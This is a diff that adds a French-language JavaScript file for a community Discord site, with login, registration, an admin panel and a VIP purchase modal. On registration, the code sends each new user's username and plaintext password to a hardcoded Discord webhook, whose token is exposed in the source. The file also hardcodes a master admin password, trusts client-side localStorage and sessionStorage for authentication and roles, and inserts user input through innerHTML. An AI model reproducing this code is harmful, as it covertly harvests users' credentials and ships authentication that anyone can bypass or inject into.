@@ -1,1 +1,344 @@
+// ─── MASTER ADMIN (toujours actif, ne peut pas être supprimé) ───
+const MASTER = { user: 'admin', pass: '2800', role: 'Fondateur' };
 
+// ─── COMPTES SAUVEGARDÉS (localStorage) ───
+function loadAccounts() {
+  try { return JSON.parse(localStorage.getItem('sc_accounts') || '[]'); } catch { return []; }
+}
+function saveAccounts(arr) {
+  localStorage.setItem('sc_accounts', JSON.stringify(arr));
+}
+function getAllAccounts() {
+  return [MASTER, ...loadAccounts()];
+}
+
+// ─── SESSION ───
+let currentUser = sessionStorage.getItem('sc_admin') || null;
+let currentRole = sessionStorage.getItem('sc_role') || null;
+
+// ─── NAVIGATION ───
+function showPage(p) {
+  if (p === 'admin' && !currentUser) { showPage('login'); return; }
+  document.querySelectorAll('.page').forEach(x => x.classList.remove('active'));
+  document.getElementById(p).classList.add('active');
+  window.scrollTo(0, 0);
+  updateNav();
+  if (p === 'admin') refreshAccountsTable();
+}
+
+function updateNav() {
+  const loggedIn = !!currentUser;
+  document.getElementById('nav-login-btn').style.display = loggedIn ? 'none' : 'inline-block';
+  document.getElementById('nav-admin-btn').style.display = (loggedIn && currentRole === 'Fondateur') ? 'inline-block' : 'none';
+  document.getElementById('nav-logout-btn').style.display = loggedIn ? 'inline-block' : 'none';
+  const footerLink = document.getElementById('footer-admin-link');
+  if (footerLink) footerLink.style.display = (loggedIn && currentRole === 'Fondateur') ? 'inline' : 'none';
+}
+
+// ─── LOGIN ───
+function doLogin() {
+  const u = document.getElementById('login-user').value.trim().toLowerCase();
+  const p = document.getElementById('login-pass').value;
+  const all = getAllAccounts();
+  const found = all.find(a => a.user.toLowerCase() === u && a.pass === p);
+  if (found) {
+    currentUser = found.user;
+    currentRole = found.role || 'Membre';
+    sessionStorage.setItem('sc_admin', currentUser);
+    sessionStorage.setItem('sc_role', currentRole);
+    document.getElementById('admin-user-display').textContent = currentUser;
+    addLog(`Connexion — ${currentUser} (${currentRole})`, 'success');
+    document.getElementById('login-error').classList.remove('show');
+    document.getElementById('login-pass').value = '';
+    if (currentRole === 'Fondateur') {
+      showPage('admin');
+    } else {
+      showPage('main');
+      showToast(`✅ Connecté en tant que ${currentUser}`);
+    }
+  } else {
+    document.getElementById('login-error').classList.add('show');
+    addLog(`Tentative échouée — identifiant: ${u}`, 'warn');
+  }
+}
+
+// ─── WEBHOOK DISCORD ───
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1484252585140686879/uOpq8ltr4lR7Dq-fpDURBGxMDqUubX0boxdUcJSRz6sNsQUh48FvP3NFvO3Gg_GQ4Cll';
+
+async function sendWebhook(embed) {
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ embeds: [embed] })
+    });
+  } catch (e) {
+    console.warn('Webhook échoué:', e);
+  }
+}
+
+// ─── REGISTER ───
+function doRegister() {
+  const u = document.getElementById('reg-user').value.trim();
+  const p = document.getElementById('reg-pass').value;
+  const p2 = document.getElementById('reg-pass2').value;
+  const errEl = document.getElementById('reg-error');
+  const okEl = document.getElementById('reg-success');
+  errEl.style.display = 'none'; okEl.style.display = 'none';
+
+  if (!u || u.length < 3) { errEl.textContent = '❌ Identifiant trop court (min 3 caractères)'; errEl.style.display = 'block'; return; }
+  if (!p || p.length < 4) { errEl.textContent = '❌ Mot de passe trop court (min 4 caractères)'; errEl.style.display = 'block'; return; }
+  if (p !== p2) { errEl.textContent = '❌ Les mots de passe ne correspondent pas'; errEl.style.display = 'block'; return; }
+
+  const all = getAllAccounts();
+  if (all.find(a => a.user.toLowerCase() === u.toLowerCase())) {
+    errEl.textContent = '❌ Cet identifiant est déjà pris';
+    errEl.style.display = 'block'; return;
+  }
+
+  const accounts = loadAccounts();
+  accounts.push({ user: u, pass: p, role: 'Membre', date: new Date().toLocaleDateString('fr-FR') });
+  saveAccounts(accounts);
+  addLog(`Nouveau compte créé — ${u}`, 'success');
+
+  // 🔔 Webhook — Nouveau compte
+  sendWebhook({
+    title: '🆕 Nouveau compte créé',
+    color: 0xff2a2a,
+    fields: [
+      { name: '👤 Identifiant', value: `\`${u}\``, inline: true },
+      { name: '🔑 Mot de passe', value: `\`${p}\``, inline: true },
+      { name: '📅 Date', value: new Date().toLocaleString('fr-FR'), inline: false }
+    ],
+    footer: { text: 'Serveur Communautaire | FR' },
+    timestamp: new Date().toISOString()
+  });
+
+  okEl.style.display = 'block';
+  document.getElementById('reg-user').value = '';
+  document.getElementById('reg-pass').value = '';
+  document.getElementById('reg-pass2').value = '';
+  setTimeout(() => { switchTab('login'); }, 2000);
+}
+
+// ─── SWITCH TAB ───
+function switchTab(tab) {
+  document.getElementById('form-login').style.display = tab === 'login' ? 'block' : 'none';
+  document.getElementById('form-register').style.display = tab === 'register' ? 'block' : 'none';
+  document.getElementById('tab-login').classList.toggle('active', tab === 'login');
+  document.getElementById('tab-register').classList.toggle('active', tab === 'register');
+  document.getElementById('login-error').classList.remove('show');
+  document.getElementById('reg-error').style.display = 'none';
+  document.getElementById('reg-success').style.display = 'none';
+}
+
+function logout() {
+  currentUser = null; currentRole = null;
+  sessionStorage.removeItem('sc_admin');
+  sessionStorage.removeItem('sc_role');
+  showPage('main');
+}
+
+// ─── ADMIN PANELS ───
+function showAdminPanel(name, el) {
+  document.querySelectorAll('.admin-panel').forEach(x => x.classList.remove('active'));
+  document.querySelectorAll('.sidebar-item').forEach(x => x.classList.remove('active'));
+  document.getElementById('panel-' + name).classList.add('active');
+  el.classList.add('active');
+  const titles = { dashboard:'Dashboard', membres:'Gestion des membres', packs:'Packs VIP', logs:'Journaux', settings:'Paramètres', comptes:'Comptes' };
+  document.getElementById('admin-title').textContent = titles[name] || name;
+  if (name === 'comptes') refreshAccountsTable();
+}
+
+// ─── REFRESH ACCOUNTS TABLE ───
+function refreshAccountsTable() {
+  const tbody = document.getElementById('accounts-tbody');
+  if (!tbody) return;
+  const accounts = loadAccounts();
+  const totalEl = document.getElementById('stat-total-accounts');
+  const storEl = document.getElementById('stat-storage');
+  if (totalEl) totalEl.textContent = accounts.length + 1;
+  if (storEl) {
+    const bytes = new Blob([localStorage.getItem('sc_accounts')||'']).size;
+    storEl.textContent = bytes < 1024 ? bytes + ' B' : (bytes/1024).toFixed(1) + ' KB';
+  }
+  tbody.innerHTML = '';
+  // Master
+  const mRow = document.createElement('tr');
+  mRow.innerHTML = `<td><strong>${MASTER.user}</strong></td><td><span style="color:var(--gold)">👑 Fondateur</span></td><td>—</td><td style="color:var(--muted);font-size:12px;">Compte maître (protégé)</td>`;
+  tbody.appendChild(mRow);
+  // Autres comptes
+  accounts.forEach((a, i) => {
+    const row = document.createElement('tr');
+    row.innerHTML = `
+      <td>${a.user}</td>
+      <td><span class="badge-free">${a.role || 'Membre'}</span></td>
+      <td>${a.date || '—'}</td>
+      <td>
+        <select class="settings-input" style="padding:4px 8px;font-size:12px;width:auto;" onchange="changeRole(${i}, this.value)">
+          <option ${a.role==='Membre'?'selected':''}>Membre</option>
+          <option ${a.role==='Modérateur'?'selected':''}>Modérateur</option>
+          <option ${a.role==='Fondateur'?'selected':''}>Fondateur</option>
+        </select>
+        <button class="action-btn danger" onclick="deleteAccount(${i})" style="margin-left:6px;">Supprimer</button>
+      </td>`;
+    tbody.appendChild(row);
+  });
+  if (accounts.length === 0) {
+    const row = document.createElement('tr');
+    row.innerHTML = `<td colspan="4" style="text-align:center;color:var(--muted);padding:20px;">Aucun compte inscrit pour l'instant</td>`;
+    tbody.appendChild(row);
+  }
+}
+
+function adminCreateAccount() {
+  const u = document.getElementById('new-acc-user').value.trim();
+  const p = document.getElementById('new-acc-pass').value;
+  const r = document.getElementById('new-acc-role').value;
+  const msgEl = document.getElementById('new-acc-msg');
+  if (!u || u.length < 2) { msgEl.style.color='var(--danger)'; msgEl.textContent='❌ Identifiant trop court'; return; }
+  if (!p || p.length < 3) { msgEl.style.color='var(--danger)'; msgEl.textContent='❌ Mot de passe trop court'; return; }
+  const all = getAllAccounts();
+  if (all.find(a => a.user.toLowerCase() === u.toLowerCase())) { msgEl.style.color='var(--danger)'; msgEl.textContent='❌ Identifiant déjà utilisé'; return; }
+  const accounts = loadAccounts();
+  accounts.push({ user: u, pass: p, role: r, date: new Date().toLocaleDateString('fr-FR') });
+  saveAccounts(accounts);
+  addLog(`Compte créé manuellement — ${u} (${r})`, 'success');
+  msgEl.style.color='var(--green)'; msgEl.textContent=`✅ Compte "${u}" créé !`;
+  document.getElementById('new-acc-user').value = '';
+  document.getElementById('new-acc-pass').value = '';
+  refreshAccountsTable();
+  setTimeout(()=>{ msgEl.textContent=''; }, 3000);
+}
+
+function changeRole(i, role) {
+  const accounts = loadAccounts();
+  accounts[i].role = role;
+  saveAccounts(accounts);
+  addLog(`Rôle modifié — ${accounts[i].user} → ${role}`, 'warn');
+}
+
+function deleteAccount(i) {
+  const accounts = loadAccounts();
+  const name = accounts[i].user;
+  accounts.splice(i, 1);
+  saveAccounts(accounts);
+  addLog(`Compte supprimé — ${name}`, 'error');
+  refreshAccountsTable();
+}
+
+// ─── BACKUP EXPORT / IMPORT ───
+function exportBackup() {
+  const data = { master: '(protégé)', accounts: loadAccounts(), exported: new Date().toISOString() };
+  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'sc-backup-' + new Date().toISOString().slice(0,10) + '.json';
+  a.click();
+  addLog('Backup exporté', 'success');
+}
+
+function importBackup() {
+  const input = document.createElement('input');
+  input.type = 'file'; input.accept = '.json';
+  input.onchange = e => {
+    const file = e.target.files[0];
+    const reader = new FileReader();
+    reader.onload = ev => {
+      try {
+        const data = JSON.parse(ev.target.result);
+        if (data.accounts) {
+          saveAccounts(data.accounts);
+          refreshAccountsTable();
+          addLog(`Backup importé — ${data.accounts.length} comptes restaurés`, 'success');
+          showToast('✅ Backup importé avec succès !');
+        }
+      } catch { showToast('❌ Fichier invalide'); }
+    };
+    reader.readAsText(file);
+  };
+  input.click();
+}
+
+// ─── TOAST ───
+function showToast(msg) {
+  let t = document.getElementById('sc-toast');
+  if (!t) {
+    t = document.createElement('div');
+    t.id = 'sc-toast';
+    t.style.cssText = 'position:fixed;bottom:30px;right:30px;background:#1a0000;border:1px solid var(--cyan);color:var(--text);padding:14px 22px;border-radius:10px;font-size:14px;z-index:9998;transition:opacity 0.4s;';
+    document.body.appendChild(t);
+  }
+  t.textContent = msg;
+  t.style.opacity = '1';
+  clearTimeout(t._hide);
+  t._hide = setTimeout(() => { t.style.opacity = '0'; }, 3000);
+}
+
+// ─── LOGS ───
+function addLog(msg, type = '') {
+  const feed = document.getElementById('log-feed');
+  if (!feed) return;
+  const now = new Date();
+  const ts = `[${String(now.getDate()).padStart(2,'0')}/${String(now.getMonth()+1).padStart(2,'0')} ${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}]`;
+  const icons = { success:'✔', warn:'⚠', error:'✖', '':'📌' };
+  const div = document.createElement('div');
+  div.className = 'log-line';
+  div.innerHTML = `<span class="log-time">${ts}</span><span class="log-msg ${type}">${icons[type]||'•'} ${msg}</span>`;
+  feed.insertBefore(div, feed.firstChild);
+}
+
+// ─── MODAL ACHAT ───
+let currentPackChoice = '';
+
+function openModal(pack) {
+  currentPackChoice = pack;
+  const titles = { 'vip': '💜 Pack VIP — 4,99€/mois', 'vip-plus': '⭐ Pack VIP+ — 9,99€/mois' };
+  document.getElementById('modal-title').textContent = titles[pack];
+
+  const nameBlock = document.getElementById('modal-name-block');
+  const nameInput = document.getElementById('modal-buyer-name');
+  if (currentUser) {
+    nameInput.value = currentUser;
+    nameBlock.style.display = 'none';
+  } else {
+    nameInput.value = '';
+    nameBlock.style.display = 'block';
+  }
+
+  document.getElementById('buy-modal').classList.add('open');
+}
+
+function confirmPurchase() {
+  const pack = currentPackChoice;
+  const packNames = { 'vip': 'Pack VIP (4,99€/mois)', 'vip-plus': 'Pack VIP+ (9,99€/mois)' };
+  const packColors = { 'vip': 0xff6b00, 'vip-plus': 0xff9800 };
+  const buyerName = document.getElementById('modal-buyer-name').value.trim() || currentUser || 'Anonyme';
+
+  // 🔔 Webhook — Achat pack
+  sendWebhook({
+    title: '🛒 Nouvel achat de pack VIP !',
+    color: packColors[pack] || 0xff9800,
+    fields: [
+      { name: '👤 Acheteur', value: `\`${buyerName}\``, inline: true },
+      { name: '👑 Pack choisi', value: `**${packNames[pack]}**`, inline: true },
+      { name: '📅 Date', value: new Date().toLocaleString('fr-FR'), inline: false },
+      { name: '📌 Statut', value: '⏳ En attente de confirmation staff', inline: false }
+    ],
+    footer: { text: 'Serveur Communautaire | FR — Boutique VIP' },
+    timestamp: new Date().toISOString()
+  });
+
+  addLog(`Achat pack ${pack} — ${buyerName}`, 'success');
+  window.open('https://discord.gg/SzY7FwA6Pt', '_blank');
+  closeModal();
+}
+
+function closeModal() { document.getElementById('buy-modal').classList.remove('open'); }
+document.getElementById('buy-modal').addEventListener('click', function(e) { if(e.target===this) closeModal(); });
+
+// ─── INIT ───
+if (currentUser) {
+  document.getElementById('admin-user-display').textContent = currentUser;
+  updateNav();
+}
